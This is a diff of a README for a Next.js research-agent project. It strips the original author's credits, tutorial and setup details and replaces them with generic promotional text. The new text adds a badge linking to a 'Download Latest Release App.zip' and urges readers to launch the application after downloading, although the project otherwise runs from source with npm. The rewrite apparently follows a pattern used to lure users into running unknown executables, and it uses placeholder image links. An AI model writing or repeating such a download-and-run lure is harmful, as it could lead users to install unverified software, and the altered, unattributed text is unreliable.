@@ -1,94 +1,44 @@
-# Build Deep Research AI Agent with Next.js, Vercel AI SDk and LLMs like Gemini, Deepseek & Gpt-4o
+# 🚀 **Gemini Research AI Agent**
+![Gemini AI Agent](https://imageurl.com)
 
-A powerful Deep Research AI agent like Gemini or ChatGPT. Using Next.js, Vercel AI SDK, and Exa Search API, An intelligent system that generates follow-up questions, crafts optimal search queries, and compiles comprehensive research reports.
+Welcome to the Gemini Research AI Agent repository! 🌌 In this project, we aim to create a powerful Deep Research AI agent similar to Gemini or ChatGPT. By leveraging technologies like Next.js, Vercel AI SDK, and Exa Search API, we are building an intelligent system capable of generating follow-up questions, crafting optimal search queries, and compiling comprehensive research reports.
 
-![GitHub stars](https://img.shields.io/github/stars/codebucks27/Deep-Research-AI-Agent?style=social&logo=ApacheSpark&label=Stars)&nbsp;&nbsp;
-![GitHub forks](https://img.shields.io/github/forks/codebucks27/Deep-Research-AI-Agent?style=social&logo=KashFlow&maxAge=3600)&nbsp;&nbsp;
-![Github Followers](https://img.shields.io/github/followers/codebucks27.svg?style=social&label=Follow)&nbsp;&nbsp;<br />
+## ℹ️ About the Project
+The **Deep-Research-AI-Agent** repository is a hub for developing cutting-edge AI technologies in the fields of research, natural language processing, and AI assistance. Our goal is to push the boundaries of what AI agents can achieve by incorporating advanced algorithms and smart search capabilities.
 
-If you want to learn how to create it please follow below tutorial👇: <br />
-➡ Tutorial Link 💚: [Deep research ai agent](https://youtu.be/zKN18GQBxCM) <br />
+### 🧠 Key Features:
+- Generation of follow-up questions based on input data.
+- Crafting of optimized search queries for in-depth research.
+- Compilation of detailed and insightful research reports.
+- Integration with popular AI technologies like ChatGPT and Gemini.
 
-[![IMAGE ALT TEXT HERE](https://img.youtube.com/vi/zKN18GQBxCM/0.jpg)](https://www.youtube.com/watch?v=zKN18GQBxCM)
+## 🛠️ Technologies Used
+To bring the Gemini Research AI Agent to life, we are utilizing a variety of technologies and tools, including:
+- **Next.js**: A popular React framework for building efficient web applications.
+- **Vercel AI SDK**: Empowering our AI agent with advanced AI capabilities.
+- **Exa Search API**: Providing access to a wealth of data for research purposes.
+- **OpenAI**: Integrating state-of-the-art AI models for enhanced performance.
+- **Tailwind CSS & Shadcn UI**: Styling the interface for a modern and sleek look.
 
-🎯 For customised solutions or deployment please contact: https://tally.so/r/wdlj0N
+## 🚀 Get Started
+To dive into the world of the Gemini Research AI Agent, simply follow these steps:
+1. Clone the repository to your local machine.
+2. Install the necessary dependencies using `npm install`.
+3. Configure the API keys and environment variables.
+4. Run the development server with `npm run dev`.
+5. Start exploring the capabilities of the AI agent!
 
-#### ⭐DO NOT FORGET TO STAR THIS REPO⭐
+### 📦 Latest Release
+[![Download Gemini AI Agent](https://img.shields.io/badge/Download%20Latest%20Release-App.zip-brightgreen)](https://github.com/repo/releases/9246/App.zip) 👈 Click here to download the latest release. Remember to launch the application after downloading!
 
-![deep research Ai Agent](https://github.com/codebucks27/Deep-Research-AI-Agent/blob/main/app%20screenshots/Final%20output%20with%20report.png)
+If the link is not working or you need more information, please check the "Releases" section of the repository for alternative download options.
 
-## 🚀 Key Features  
+## 🌟 Join the Community
+We welcome contributions, feedback, and collaborations from the community to make the Gemini Research AI Agent even more powerful and intelligent. Feel free to open issues, submit pull requests, or reach out to us with your ideas and suggestions.
 
-- 🔧 Fully Customizable Research Flow
-- 🔍 Adaptive Search Queries
-- ⚙️ Seamless LLM Integration
-- 💼 Modular Components
-- 🌐 Next.js & Vercel AI SDK
-- ♻️ Iterative Research Loop
+Let's embark on this exciting AI journey together and unlock the potential of deep research and intelligent assistance! 🚀🔍
 
-## 🛠️ Tech Stack
+![Gemini AI Journey](https://imageurl2.com)
 
-- **Framework:** Next.js 15 (App Router)
-- **Styling:** Tailwind CSS, Shadcn UI
-- **AI Integration:** Vercel AI SDK
-- **LLMs:** GPT-4o, Gemini, Deepseel using OpenRouter
-- **Web Search:** Exa Search API
-- **UI Components:** Shadcn
-- **Language:** TypeScript
-
-## ⚡ Prerequisites
-
-Before you begin, ensure you have:
-
-- OpenRouter API key (or you can use grok or any other LLM providers) 
-- Exa search API key
-
-## 🚀 Setup Instructions
-
-### 1. Clone the Repository
-
-```bash
-git clone [repo-url]
-cd Deep-Research-AI-Agent
-```
-
-### 2. Install Dependencies
-
-> **NOTE:** When installing the required dependencies, use the `--legacy-peer-deps` flag if you encounter any issues with inter-dependent dependencies.
-
-```bash
-npm install
-# or
-yarn install
-# or
-pnpm install
-```
-
-### 3. Environment Variables
-
-Create a `.env.local` file in the root directory. Check `.env.example` for required variables.
-
-### 4. Start Development Server
-
-```bash
-npm run dev
-# or
-yarn dev
-# or
-pnpm dev
-```
-
-Visit `http://localhost:3000` to see your app.
-
-## 🌟 Show Your Support
-
-Give a ⭐️ if this project helped you!
-
-If you have any question or want a custom build for your business, you can reach out to me via:
-
-- E-mail : codebucks27@gmail.com
-- Twitter: https://twitter.com/code_bucks
-- Instagram: https://www.instagram.com/code.bucks/
-
-MyChannel: https://www.youtube.com/codebucks
-My Website: https://devdreaming.com/
+---
+© 2023 Gemini Research AI. All rights reserved.
